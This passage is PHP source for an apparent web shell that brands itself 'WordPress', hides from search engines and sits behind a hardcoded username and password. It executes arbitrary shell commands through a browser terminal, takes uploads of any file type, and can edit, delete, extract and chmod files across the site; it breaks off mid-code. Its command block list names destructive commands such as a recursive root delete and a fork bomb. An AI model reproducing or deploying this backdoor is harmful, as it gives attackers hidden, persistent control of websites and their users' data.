<?php
session_start();
// Konfigurasi Keamanan
define('APP_NAME', 'WordPress');
define('MAX_FILE_SIZE', 52428800); // 50MB
define('ALLOWED_EXTENSIONS', ['*']); // Semua ekstensi diizinkan
define('LOGIN_TIMEOUT', 7200); // 2 jam
define('MAX_TERMINAL_OUTPUT', 10000); // Batas output terminal
define('BLOCKED_COMMANDS', ['rm -rf /', 'dd if=', ':(){ :|:& };:', 'mkfs', 'format', 'fdisk']);
// Tambahkan konfigurasi path root
define('ROOT_PATH', realpath($_SERVER['DOCUMENT_ROOT'])); // Path root website (public_html)

// Fungsi Keamanan
function sanitizeInput($input) {
    return htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
}

function validatePath($path) {
    // Hapus karakter berbahaya seperti null byte
    $path = str_replace("\0", '', $path);
    
    // Jika path kosong, kembalikan path root
    if (empty($path)) {
        return ROOT_PATH;
    }
    
    // Normalisasi path untuk menghilangkan ../ yang berbahaya
    // tapi tetap memungkinkan navigasi direktori yang valid
    $path = str_replace('//', '/', $path);
    
    // Jika path relatif, buat menjadi absolut dari root
    if ($path[0] !== '/') {
        $path = ROOT_PATH . '/' . $path;
    }
    
    // Normalisasi path yang mengandung ../
    $parts = explode('/', $path);
    $normalized = [];
    
    foreach ($parts as $part) {
        if ($part === '' || $part === '.') {
            continue;
        } elseif ($part === '..') {
            // Hapus bagian sebelumnya jika ada dan bukan root
            if (count($normalized) > 0 && end($normalized) !== '') {
                array_pop($normalized);
            }
        } else {
            $normalized[] = $part;
        }
    }
    
    $path = '/' . implode('/', $normalized);
    
    // Pastikan path tidak keluar dari root
    if (strpos($path, ROOT_PATH) !== 0) {
        return ROOT_PATH;
    }
    
    return $path;
}

function isCommandSafe($command) {
    // Cek perintah yang diblokir
    foreach (BLOCKED_COMMANDS as $blocked) {
        if (strpos($command, $blocked) !== false) {
            return false;
        }
    }
    return true;
}

// Fungsi untuk memastikan direktori ada dan dapat ditulis
function ensureDirectoryExists($path) {
    if (!is_dir($path)) {
        if (!mkdir($path, 0755, true)) {
            return false;
        }
    }
    return is_writable($path);
}

// Fungsi untuk ekstrak file ZIP
function extractZip($filePath, $destination) {
    if (!class_exists('ZipArchive')) {
        return "ERROR: ZipArchive tidak tersedia";
    }
    
    $zip = new ZipArchive;
    if ($zip->open($filePath) === TRUE) {
        if (!ensureDirectoryExists($destination)) {
            return "ERROR: Tidak dapat membuat direktori tujuan";
        }
        $zip->extractTo($destination);
        $zip->close();
        return "Berhasil mengekstrak file ZIP";
    } else {
        return "ERROR: Gagal membuka file ZIP";
    }
}

// Fungsi untuk ekstrak file RAR
function extractRar($filePath, $destination) {
    if (!function_exists('rar_open')) {
        // Coba gunakan command line unrar jika tersedia
        if (shell_exec('which unrar')) {
            if (!ensureDirectoryExists($destination)) {
                return "ERROR: Tidak dapat membuat direktori tujuan";
            }
            $command = "unrar x -o+ " . escapeshellarg($filePath) . " " . escapeshellarg($destination);
            shell_exec($command);
            return "Berhasil mengekstrak file RAR menggunakan command line";
        }
        return "ERROR: RAR extension tidak tersedia dan unrar command tidak ditemukan";
    }
    
    $rar = rar_open($filePath);
    if ($rar) {
        $entries = rar_list($rar);
        if (!ensureDirectoryExists($destination)) {
            return "ERROR: Tidak dapat membuat direktori tujuan";
        }
        foreach ($entries as $entry) {
            $entry->extract($destination);
        }
        rar_close($rar);
        return "Berhasil mengekstrak file RAR";
    } else {
        return "ERROR: Gagal membuka file RAR";
    }
}

// Fungsi untuk menyalin file atau folder
function copyItem($source, $destination) {
    if (is_file($source)) {
        return copy($source, $destination);
    } elseif (is_dir($source)) {
        if (!ensureDirectoryExists($destination)) {
            return false;
        }
        
        $dir = opendir($source);
        while ($file = readdir($dir)) {
            if ($file != '.' && $file != '..') {
                if (!copyItem($source . '/' . $file, $destination . '/' . $file)) {
                    return false;
                }
            }
        }
        closedir($dir);
        return true;
    }
    return false;
}

// Fungsi untuk memindahkan file atau folder
function moveItem($source, $destination) {
    // Pastikan direktori tujuan ada
    $destinationDir = dirname($destination);
    if (!ensureDirectoryExists($destinationDir)) {
        return false;
    }
    return rename($source, $destination);
}

// Fungsi untuk mengubah permission
function changePermissions($path, $permissions) {
    if (!file_exists($path)) {
        return false;
    }
    return chmod($path, octdec($permissions));
}

// Fungsi untuk mendapatkan tipe MIME file
function getMimeType($filePath) {
    if (function_exists('mime_content_type')) {
        return mime_content_type($filePath);
    } elseif (function_exists('finfo_open')) {
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mimeType = finfo_file($finfo, $filePath);
        finfo_close($finfo);
        return $mimeType;
    }
    return false;
}

// Fungsi untuk menentukan apakah file bisa dilihat di browser
function isViewableInBrowser($filePath) {
    $mimeType = getMimeType($filePath);
    if (!$mimeType) {
        // Fallback ke ekstensi file
        $ext = strtolower(pathinfo($filePath, PATHINFO_EXTENSION));
        $viewableExtensions = ['jpg', 'jpeg', 'png', 'gif', 'svg', 'bmp', 'webp', 'pdf', 'txt', 'html', 'htm', 'css', 'js', 'json', 'xml'];
        return in_array($ext, $viewableExtensions);
    }
    
    $viewableMimeTypes = [
        'image/jpeg', 'image/png', 'image/gif', 'image/svg+xml', 'image/bmp', 'image/webp',
        'text/plain', 'text/html', 'text/css', 'application/javascript', 'application/json', 'application/xml',
        'application/pdf'
    ];
    
    return in_array($mimeType, $viewableMimeTypes);
}

// Fungsi untuk menentukan apakah file bisa diedit sebagai teks
function isTextFile($filePath) {
    $mimeType = getMimeType($filePath);
    
    // Cek berdasarkan MIME type
    if ($mimeType) {
        if (strpos($mimeType, 'text/') === 0) {
            return true;
        }
        
        $textMimeTypes = [
            'application/javascript', 'application/json', 'application/xml', 
            'application/x-httpd-php', 'application/x-sh', 'application/sql'
        ];
        
        if (in_array($mimeType, $textMimeTypes)) {
            return true;
        }
    }
    
    // Fallback ke ekstensi file
    $ext = strtolower(pathinfo($filePath, PATHINFO_EXTENSION));
    $textExtensions = [
        'txt', 'php', 'html', 'htm', 'css', 'js', 'json', 'xml', 'sql', 
        'py', 'java', 'cpp', 'c', 'h', 'sh', 'md', 'log', 'conf', 'ini',
        'htaccess', 'env', 'gitignore', 'yml', 'yaml'
    ];
    
    return in_array($ext, $textExtensions);
}

// Autentikasi
if (!isset($_SESSION['authenticated']) || (time() - $_SESSION['last_activity'] > LOGIN_TIMEOUT)) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
        $username = 'asal'; // Ganti dengan username yang aman
        $password = 'mangeakk'; // Ganti dengan password yang kuat
        
        if ($_POST['username'] === $username && $_POST['password'] === $password) {
            $_SESSION['authenticated'] = true;
            $_SESSION['last_activity'] = time();
            $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $login_error = 'Kredensial tidak valid!';
        }
    }
    
    // Tampilkan form login
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="robots" content="noindex, nofollow">
        <title>Login - <?php echo APP_NAME; ?></title>
        <script src="https://cdn.tailwindcss.com"></script>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    </head>
    <body class="bg-gradient-to-br from-gray-900 to-gray-800 min-h-screen flex items-center justify-center">
        <div class="bg-white p-8 rounded-xl shadow-2xl w-full max-w-md">
            <div class="text-center mb-8">
                <i class="fas fa-shield-alt text-5xl text-blue-600 mb-4"></i>
                <h1 class="text-3xl font-bold text-gray-800"><?php echo APP_NAME; ?></h1>
                <p class="text-gray-600 mt-2">Akses Sistem Terlindungi</p>
            </div>
            
            <?php if (isset($login_error)): ?>
                <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-6">
                    <div class="flex">
                        <div class="flex-shrink-0">
                            <i class="fas fa-exclamation-circle text-red-500"></i>
                        </div>
                        <div class="ml-3">
                            <p class="text-sm text-red-700"><?php echo $login_error; ?></p>
                        </div>
                    </div>
                </div>
            <?php endif; ?>
            
            <form method="post" action="" class="space-y-6">
                <div>
                    <label for="username" class="block text-sm font-medium text-gray-700">Username</label>
                    <div class="mt-1 relative rounded-md shadow-sm">
                        <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                            <i class="fas fa-user text-gray-400"></i>
                        </div>
                        <input type="text" id="username" name="username" required
                               class="pl-10 focus:ring-blue-500 focus:border-blue-500 block w-full shadow-sm sm:text-sm border-gray-300 rounded-md py-2 border">
                    </div>
                </div>
                
                <div>
                    <label for="password" class="block text-sm font-medium text-gray-700">Password</label>
                    <div class="mt-1 relative rounded-md shadow-sm">
                        <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                            <i class="fas fa-lock text-gray-400"></i>
                        </div>
                        <input type="password" id="password" name="password" required
                               class="pl-10 focus:ring-blue-500 focus:border-blue-500 block w-full shadow-sm sm:text-sm border-gray-300 rounded-md py-2 border">
                    </div>
                </div>
                
                <div>
                    <button type="submit" name="login" 
                            class="w-full flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500">
                        <i class="fas fa-sign-in-alt mr-2"></i> Masuk
                    </button>
                </div>
            </form>
            
            <div class="mt-6 text-center">
                <p class="text-xs text-gray-500">
                    <i class="fas fa-info-circle mr-1"></i> 
                    Akses hanya untuk administrator terotorisasi
                </p>
            </div>
                        
            <div class="mt-8 pt-4 border-t border-gray-200 text-center">
                <p class="text-xs text-gray-400">
                    <i class="fas fa-code mr-1"></i> 
                    Created by <span class="font-medium">Tom The Tennessee</span> &copy; <?php echo date('Y'); ?>
                </p>
                <p class="text-xs text-gray-400 mt-2">
                    <i class="fab fa-instagram mr-1"></i>
                    Follow us: <a href="https://instagram.com/jokowi" target="_blank" class="text-blue-500 hover:text-blue-700">@KOI_GROUP</a>
                </p>
            </div>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Perbarui aktivitas session
$_SESSION['last_activity'] = time();

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Variabel global
// PERBAIKAN: Simpan path absolut saat ini di session
if (isset($_GET['dir'])) {
    $currentDir = validatePath($_GET['dir']);
    $_SESSION['current_dir'] = $currentDir;
} elseif (isset($_SESSION['current_dir'])) {
    $currentDir = $_SESSION['current_dir'];
} else {
    $currentDir = ROOT_PATH;
    $_SESSION['current_dir'] = $currentDir;
}

$message = '';
$messageType = '';
$terminalOutput = '';

// Inisialisasi clipboard jika belum ada
if (!isset($_SESSION['clipboard'])) {
    $_SESSION['clipboard'] = [
        'action' => null,
        'source_path' => null,
        'source_dir' => null,
        'item_name' => null
    ];
}

// Fungsi utilitas
function formatSize($size) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    for ($i = 0; $size >= 1024 && $i < count($units) - 1; $i++) {
        $size /= 1024;
    }
    return round($size, 2) . ' ' . $units[$i];
}

function formatDate($timestamp) {
    return date('d M Y H:i:s', $timestamp);
}

function getFileIcon($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $icons = [
        'php' => 'fa-file-code text-purple-500',
        'html' => 'fa-file-code text-orange-500',
        'css' => 'fa-file-code text-blue-500',
        'js' => 'fa-file-code text-yellow-500',
        'json' => 'fa-file-code text-green-500',
        'xml' => 'fa-file-code text-teal-500',
        'sql' => 'fa-file-code text-red-500',
        'py' => 'fa-file-code text-blue-600',
        'java' => 'fa-file-code text-red-600',
        'cpp' => 'fa-file-code text-indigo-600',
        'c' => 'fa-file-code text-gray-600',
        'h' => 'fa-file-code text-gray-500',
        'pdf' => 'fa-file-pdf text-red-500',
        'doc' => 'fa-file-word text-blue-500',
        'docx' => 'fa-file-word text-blue-500',
        'xls' => 'fa-file-excel text-green-500',
        'xlsx' => 'fa-file-excel text-green-500',
        'ppt' => 'fa-file-powerpoint text-orange-500',
        'pptx' => 'fa-file-powerpoint text-orange-500',
        'jpg' => 'fa-file-image text-purple-500',
        'jpeg' => 'fa-file-image text-purple-500',
        'png' => 'fa-file-image text-purple-500',
        'gif' => 'fa-file-image text-purple-500',
        'svg' => 'fa-file-image text-purple-400',
        'bmp' => 'fa-file-image text-purple-600',
        'mp4' => 'fa-file-video text-red-600',
        'avi' => 'fa-file-video text-red-600',
        'mkv' => 'fa-file-video text-red-600',
        'mov' => 'fa-file-video text-red-600',
        'wmv' => 'fa-file-video text-red-600',
        'flv' => 'fa-file-video text-red-600',
        'mp3' => 'fa-file-audio text-green-600',
        'wav' => 'fa-file-audio text-green-600',
        'flac' => 'fa-file-audio text-green-600',
        'aac' => 'fa-file-audio text-green-600',
        'ogg' => 'fa-file-audio text-green-600',
        'zip' => 'fa-file-archive text-yellow-500',
        'rar' => 'fa-file-archive text-yellow-500',
        '7z' => 'fa-file-archive text-yellow-500',
        'tar' => 'fa-file-archive text-yellow-500',
        'gz' => 'fa-file-archive text-yellow-500',
        'txt' => 'fa-file-alt text-gray-500',
        'md' => 'fa-file-alt text-gray-600',
        'log' => 'fa-file-alt text-gray-400',
        'conf' => 'fa-file-alt text-gray-700',
        'ini' => 'fa-file-alt text-gray-600',
        'exe' => 'fa-cog text-gray-700',
        'dmg' => 'fa-compact-disc text-gray-600',
        'iso' => 'fa-compact-disc text-gray-600',
        'apk' => 'fa-mobile-alt text-green-500',
        'ipa' => 'fa-mobile-alt text-gray-500',
    ];
    
    return isset($icons[$ext]) ? $icons[$ext] : 'fa-file text-gray-500';
}

// Fungsi untuk menentukan kelas warna folder berdasarkan permission
function getFolderColorClass($path) {
    if (!is_dir($path)) {
        return '';
    }
    
    // Cek apakah ini adalah root directory
    if ($path === ROOT_PATH) {
        return 'text-blue-600'; // Warna khusus untuk root
    }
    
    $isReadable = is_readable($path);
    $isWritable = is_writable($path);
    
    if (!$isReadable) {
        return 'text-red-600'; // Red dir - tidak bisa dibaca
    } elseif ($isWritable) {
        return 'text-green-600'; // Green dir - bisa ditulis
    } else {
        return 'text-gray-600'; // White/Gray dir - hanya bisa dibaca
    }
}

// Fungsi untuk mendapatkan path relatif dari root
function getRelativePath($path) {
    $rootPath = ROOT_PATH;
    if (strpos($path, $rootPath) === 0) {
        $relativePath = substr($path, strlen($rootPath));
        return $relativePath === '' ? '/' : $relativePath;
    }
    return $path;
}

// Proses terminal command
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['terminal_command']) && isset($_POST['csrf_token']) && $_POST['csrf_token'] === $_SESSION['csrf_token']) {
    $command = $_POST['terminal_command'];
    
    if (!isCommandSafe($command)) {
        $terminalOutput = "ERROR: Perintah tidak diizinkan untuk alasan keamanan\n";
    } else {
        // Set working directory
        $cwd = $currentDir;
        
        // Jalankan perintah
        $descriptors = [
            0 => ['pipe', 'r'],  // stdin
            1 => ['pipe', 'w'],  // stdout
            2 => ['pipe', 'w']   // stderr
        ];
        
        $process = proc_open($command, $descriptors, $pipes, $cwd);
        
        if (is_resource($process)) {
            fclose($pipes[0]);
            
            $output = stream_get_contents($pipes[1]);
            $error = stream_get_contents($pipes[2]);
            
            fclose($pipes[1]);
            fclose($pipes[2]);
            
            $return_value = proc_close($process);
            
            $terminalOutput = $output;
            if (!empty($error)) {
                $terminalOutput .= "\nERROR: " . $error;
            }
            
            if ($return_value !== 0) {
                $terminalOutput .= "\nExit code: " . $return_value;
            }
            
            // Batasi output
            if (strlen($terminalOutput) > MAX_TERMINAL_OUTPUT) {
                $terminalOutput = substr($terminalOutput, 0, MAX_TERMINAL_OUTPUT) . "\n... (output dipotong)";
            }
        } else {
            $terminalOutput = "ERROR: Gagal menjalankan perintah\n";
        }
    }
}

// Proses upload file
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file']) && isset($_POST['csrf_token']) && $_POST['csrf_token'] === $_SESSION['csrf_token']) {
    try {
        if ($_FILES['file']['error'] === UPLOAD_ERR_OK) {
            $filename = basename($_FILES['file']['name']);
            $fileExt = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
            $targetPath = $currentDir . '/' . $filename;
            
            // Periksa ekstensi file
            if (ALLOWED_EXTENSIONS[0] !== '*' && !in_array($fileExt, ALLOWED_EXTENSIONS)) {
                $message = 'Ekstensi file tidak diizinkan!';
                $messageType = 'error';
            } elseif ($_FILES['file']['size'] > MAX_FILE_SIZE) {
                $message = 'Ukuran file terlalu besar (maksimal ' . formatSize(MAX_FILE_SIZE) . ')';
                $messageType = 'error';
            } else {
                // Pastikan direktori tujuan ada dan dapat ditulis
                if (!ensureDirectoryExists($currentDir)) {
                    $message = 'Direktori tujuan tidak dapat ditulis!';
                    $messageType = 'error';
                } else {
                    if (move_uploaded_file($_FILES['file']['tmp_name'], $targetPath)) {
                        $message = 'File berhasil diupload!';
                        $messageType = 'success';
                    } else {
                        $message = 'Gagal mengupload file!';
                        $messageType = 'error';
                    }
                }
            }
        } else {
            // Tangani error upload
            switch ($_FILES['file']['error']) {
                case UPLOAD_ERR_INI_SIZE:
                    $message = 'Ukuran file melebihi batas maksimum di server!';
                    break;
                case UPLOAD_ERR_FORM_SIZE:
                    $message = 'Ukuran file melebihi batas maksimum yang ditentukan!';
                    break;
                case UPLOAD_ERR_PARTIAL:
                    $message = 'File hanya terupload sebagian!';
                    break;
                case UPLOAD_ERR_NO_FILE:
                    $message = 'Tidak ada file yang diupload!';
                    break;
                case UPLOAD_ERR_NO_TMP_DIR:
                    $message = 'Folder temporary tidak tersedia!';
                    break;
                case UPLOAD_ERR_CANT_WRITE:
                    $message = 'Gagal menulis file ke disk!';
                    break;
                case UPLOAD_ERR_EXTENSION:
                    $message = 'Upload file dihentikan oleh ekstensi PHP!';
                    break;
                default:
                    $message = 'Error upload file tidak diketahui!';
                    break;
            }
            $messageType = 'error';
        }
    } catch (Exception $e) {
        $message = 'Error: ' . $e->getMessage();
        $messageType = 'error';
    }
}

// Proses buat folder
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['mkdir']) && isset($_POST['csrf_token']) && $_POST['csrf_token'] === $_SESSION['csrf_token']) {
    $dirname = $_POST['dirname'];
    // Validasi nama folder
    if (preg_match('/[\/:*?"<>|]/', $dirname)) {
        $message = 'Nama folder mengandung karakter tidak valid!';
        $messageType = 'error';
    } else {
        $newDirPath = $currentDir . '/' . $dirname;
        
        if (!file_exists($newDirPath)) {
            if (mkdir($newDirPath, 0755, true)) {
                $message = 'Folder berhasil dibuat!';
                $messageType = 'success';
            } else {
                $message = 'Gagal membuat folder! Periksa permission direktori.';
                $messageType = 'error';
            }
        } else {
            $message = 'Folder sudah ada!';
            $messageType = 'error';
        }
    }
}

// Proses buat file baru
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['createfile']) && isset($_POST['csrf_token']) && $_POST['csrf_token'] === $_SESSION['csrf_token']) {
    $filename = $_POST['filename'];
    // Validasi nama file
    if (preg_match('/[\/:*?"<>|]/', $filename)) {
        $message = 'Nama file mengandung karakter tidak valid!';
        $messageType = 'error';
    } else {
        $filePath = $currentDir . '/' . $filename;
        
        if (!file_exists($filePath)) {
            if (touch($filePath)) {
                $message = 'File berhasil dibuat!';
                $messageType = 'success';
            } else {
                $message = 'Gagal membuat file! Periksa permission direktori.';
                $messageType = 'error';
            }
        } else {
            $message = 'File sudah ada!';
            $messageType = 'error';
        }
    }
}

// Proses hapus file/folder
if (isset($_GET['delete']) && isset($_GET['csrf_token']) && $_GET['csrf_token'] === $_SESSION['csrf_token']) {
    $deleteItem = $_GET['delete'];
    // Gunakan path absolut dari root
    $targetPath = validatePath(ROOT_PATH . '/' . $deleteItem);
    
    if (file_exists($targetPath)) {
        if (is_file($targetPath)) {
            if (is_writable($targetPath)) {
                if (unlink($targetPath)) {
                    $message = 'File berhasil dihapus!';
                    $messageType = 'success';
                } else {
                    $message = 'Gagal menghapus file!';
                    $messageType = 'error';
                }
            } else {
                $message = 'File tidak dapat dihapus karena tidak memiliki izin!';
                $messageType = 'error';
            }
        } elseif (is_dir($targetPath)) {
            // Cek apakah folder dapat ditulis (dapat dihapus)
            if (is_writable($targetPath)) {
                // Hapus folder rekursif
                function deleteDirectory($dir) {
                    if (!file_exists($dir)) {
                        return true;
                    }
                    
                    if (!is_dir($dir)) {
                        return unlink($dir);
                    }
                    
                    foreach (scandir($dir) as $item) {
                        if ($item == '.' || $item == '..') {
                            continue;
                        }
                        
                        if (!deleteDirectory($dir . '/' . $item)) {
                            return false;
                        }
                    }
                    
                    return rmdir($dir);
                }
                
                if (deleteDirectory($targetPath)) {
                    $message = 'Folder berhasil dihapus!';
                    $messageType = 'success';
                } else {
                    $message = 'Gagal menghapus folder! Periksa permission.';
                    $messageType = 'error';
                }
            } else {
                $message = 'Folder tidak dapat dihapus karena tidak memiliki izin!';
                $messageType = 'error';
            }
        }
    } else {
        $message = 'Item tidak ditemukan!';
        $messageType = 'error';
    }
}

// Proses rename file/folder
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['rename']) && isset($_POST['csrf_token']) && $_POST['csrf_token'] === $_SESSION['csrf_token']) {
    $oldname = $_POST['oldname'];
    $newname = $_POST['newname'];
    
    // Gunakan path absolut dari root untuk oldname
    $oldPath = validatePath(ROOT_PATH . '/' . $oldname);
    
    // Untuk newname, gabungkan dengan direktori saat ini
    $newPath = $currentDir . '/' . $newname;
    
    // Validasi newname untuk mencegah karakter berbahaya
    if (preg_match('/[\/:*?"<>|]/', $newname)) {
        $message = 'Nama mengandung karakter tidak valid!';
        $messageType = 'error';
    } else {
        // Validasi path untuk memastikan tidak keluar dari root
        $newPath = validatePath($newPath);
        
        if (file_exists($oldPath) && !file_exists($newPath)) {
            // Pastikan direktori tujuan ada dan dapat ditulis
            $destinationDir = dirname($newPath);
            if (!ensureDirectoryExists($destinationDir)) {
                $message = 'Direktori tujuan tidak dapat ditulis!';
                $messageType = 'error';
            } else {
                if (rename($oldPath, $newPath)) {
                    $message = 'Berhasil mengubah nama!';
                    $messageType = 'success';
                } else {
                    $message = 'Gagal mengubah nama! Periksa permission.';
                    $messageType = 'error';
                }
            }
        } else {
            if (!file_exists($oldPath)) {
                $message = 'Item yang akan diubah nama tidak ditemukan!';
            } else {
                $message = 'Nama sudah ada!';
            }
            $messageType = 'error';
        }
    }
}

// Proses view file
if (isset($_GET['view']) && isset($_GET['csrf_token']) && $_GET['csrf_token'] === $_SESSION['csrf_token']) {
    $viewFile = $_GET['view'];
    // Gunakan path absolut dari root
    $filePath = validatePath(ROOT_PATH . '/' . $viewFile);
    
    if (is_file($filePath) && is_readable($filePath)) {
        $mimeType = getMimeType($filePath);
        
        // Set header yang sesuai berdasarkan tipe file
        if ($mimeType) {
            header('Content-Type: ' . $mimeType);
        }
        
        // Untuk PDF, tampilkan di browser
        if ($mimeType === 'application/pdf') {
            header('Content-Disposition: inline; filename="' . basename($filePath) . '"');
        } 
        // Untuk gambar, tampilkan di browser
        elseif (strpos($mimeType, 'image/') === 0) {
            header('Content-Disposition: inline; filename="' . basename($filePath) . '"');
        }
        // Untuk file teks, tampilkan di browser
        elseif (strpos($mimeType, 'text/') === 0 || in_array($mimeType, ['application/javascript', 'application/json', 'application/xml'])) {
            header('Content-Type: text/plain');
            header('Content-Disposition: inline; filename="' . basename($filePath) . '"');
        }
        // Untuk file lain, force download
        else {
            header('Content-Disposition: attachment; filename="' . basename($filePath) . '"');
        }
        
        readfile($filePath);
        exit;
    } else {
        $message = 'File tidak ditemukan atau tidak dapat dibaca!';
        $messageType = 'error';
    }
}

// Proses download file
if (isset($_GET['download']) && isset($_GET['csrf_token']) && $_GET['csrf_token'] === $_SESSION['csrf_token']) {
    $downloadFile = $_GET['download'];
    // Gunakan path absolut dari root
    $filePath = validatePath(ROOT_PATH . '/' . $downloadFile);
    
    if (is_file($filePath) && is_readable($filePath)) {
        $mimeType = getMimeType($filePath);
        
        // Set header untuk download
        if ($mimeType) {
            header('Content-Type: ' . $mimeType);
        } else {
            header('Content-Type: application/octet-stream');
        }
        
        header('Content-Disposition: attachment; filename="' . basename($filePath) . '"');
        header('Content-Length: ' . filesize($filePath));
        header('Cache-Control: private, no-cache, no-store, must-revalidate');
        header('Pragma: no-cache');
        header('Expires: 0');
        
        readfile($filePath);
        exit;
    } else {
        $message = 'File tidak ditemukan atau tidak dapat dibaca!';
        $messageType = 'error';
    }
}

// Proses edit file
if (isset($_GET['edit']) && isset($_GET['csrf_token']) && $_GET['csrf_token'] === $_SESSION['csrf_token']) {
    $editFile = $_GET['edit'];
    // Gunakan path absolut dari root
    $filePath = validatePath(ROOT_PATH . '/' . $editFile);
    
    if (is_file($filePath) && is_readable($filePath)) {
        // Gunakan fungsi isTextFile yang baru untuk menentukan apakah file bisa diedit
        if (isTextFile($filePath)) {
            // Tambahkan pemeriksaan apakah file dapat ditulis
            if (is_writable($filePath)) {
                $fileContent = file_get_contents($filePath);
                $editingFile = $editFile;
            } else {
                $message = 'File tidak dapat ditulis!';
                $messageType = 'error';
            }
        } else {
            // Untuk file non-teks, tampilkan dialog konfirmasi
            $editNonTextFile = $editFile;
        }
    } else {
        $message = 'File tidak ditemukan atau tidak dapat dibaca!';
        $messageType = 'error';
    }
}

// Proses save file
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_file']) && isset($_POST['csrf_token']) && $_POST['csrf_token'] === $_SESSION['csrf_token']) {
    $filename = $_POST['filename'];
    $content = $_POST['file_content'];
    // Gunakan path absolut dari root
    $filePath = validatePath(ROOT_PATH . '/' . $filename);
    
    if (file_put_contents($filePath, $content) !== false) {
        $message = 'File berhasil disimpan!';
        $messageType = 'success';
        unset($editingFile, $fileContent);
    } else {
        $message = 'Gagal menyimpan file! Periksa permission.';
        $messageType = 'error';
    }
}

// Proses ekstrak file
if (isset($_GET['extract']) && isset($_GET['csrf_token']) && $_GET['csrf_token'] === $_SESSION['csrf_token']) {
    $extractFile = $_GET['extract'];
    // Gunakan path absolut dari root
    $filePath = validatePath(ROOT_PATH . '/' . $extractFile);
    
    if (is_file($filePath)) {
        $ext = strtolower(pathinfo($filePath, PATHINFO_EXTENSION));
        // Ekstrak ke direktori yang sama dengan file
        $extractDir = dirname($filePath) . '/' . pathinfo($filePath, PATHINFO_FILENAME);
        
        if ($ext === 'zip') {
            $result = extractZip($filePath, $extractDir);
        } elseif ($ext === 'rar') {
            $result = extractRar($filePath, $extractDir);
        } else {
            $result = "ERROR: Format file tidak didukung untuk ekstraksi";
        }
        
        $message = $result;
        $messageType = strpos($result, 'ERROR') !== false ? 'error' : 'success';
    } else {
        $message = 'File tidak ditemukan!';
        $messageType = 'error';
    }
}

// Proses copy/cut
if (isset($_GET['copy']) && isset($_GET['csrf_token']) && $_GET['csrf_token'] === $_SESSION['csrf_token']) {
    $copyItem = $_GET['copy'];
    // Gunakan path absolut dari root
    $itemPath = validatePath(ROOT_PATH . '/' . $copyItem);
    
    if (file_exists($itemPath)) {
        $_SESSION['clipboard'] = [
            'action' => 'copy',
            'source_path' => $itemPath,
            'source_dir' => dirname($itemPath),
            'item_name' => basename($itemPath)
        ];
        $message = 'Item disalin ke clipboard!';
        $messageType = 'success';
    } else {
        $message = 'Item tidak ditemukan!';
        $messageType = 'error';
    }
}

if (isset($_GET['cut']) && isset($_GET['csrf_token']) && $_GET['csrf_token'] === $_SESSION['csrf_token']) {
    $cutItem = $_GET['cut'];
    // Gunakan path absolut dari root
    $itemPath = validatePath(ROOT_PATH . '/' . $cutItem);
    
    if (file_exists($itemPath)) {
        $_SESSION['clipboard'] = [
            'action' => 'cut',
            'source_path' => $itemPath,
            'source_dir' => dirname($itemPath),
            'item_name' => basename($itemPath)
        ];
        $message = 'Item dipotong ke clipboard!';
        $messageType = 'success';
    } else {
        $message = 'Item tidak ditemukan!';
        $messageType = 'error';
    }
}

// Proses paste
if (isset($_GET['paste']) && isset($_GET['csrf_token']) && $_GET['csrf_token'] === $_SESSION['csrf_token']) {
    if ($_SESSION['clipboard']['action'] && $_SESSION['clipboard']['source_path']) {
        $sourcePath = $_SESSION['clipboard']['source_path'];
        $itemName = $_SESSION['clipboard']['item_name'];
        $targetPath = $currentDir . '/' . $itemName;
        
        // Validasi path untuk memastikan tidak keluar dari root
        $targetPath = validatePath($targetPath);
        
        // Cek apakah target sudah ada
        if (file_exists($targetPath)) {
            $message = 'Item sudah ada di direktori tujuan!';
            $messageType = 'error';
        } else {
            if ($_SESSION['clipboard']['action'] === 'copy') {
                if (copyItem($sourcePath, $targetPath)) {
                    $message = 'Item berhasil disalin!';
                    $messageType = 'success';
                } else {
                    $message = 'Gagal menyalin item! Periksa permission.';
                    $messageType = 'error';
                }
            } elseif ($_SESSION['clipboard']['action'] === 'cut') {
                if (moveItem($sourcePath, $targetPath)) {
                    $message = 'Item berhasil dipindahkan!';
                    $messageType = 'success';
                } else {
                    $message = 'Gagal memindahkan item! Periksa permission.';
                    $messageType = 'error';
                }
            }
            
            // Reset clipboard setelah paste
            $_SESSION['clipboard'] = [
                'action' => null,
                'source_path' => null,
                'source_dir' => null,
                'item_name' => null
            ];
        }
    } else {
        $message = 'Tidak ada item di clipboard!';
        $messageType = 'error';
    }
}

// Proses chmod
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['chmod']) && isset($_POST['csrf_token']) && $_POST['csrf_token'] === $_SESSION['csrf_token']) {
    $chmodItem = $_POST['chmod_item'];
    $permissions = $_POST['permissions'];
    // Gunakan path absolut dari root
    $itemPath = validatePath(ROOT_PATH . '/' . $chmodItem);
    
    if (file_exists($itemPath) && preg_match('/^[0-7]{3,4}$/', $permissions)) {
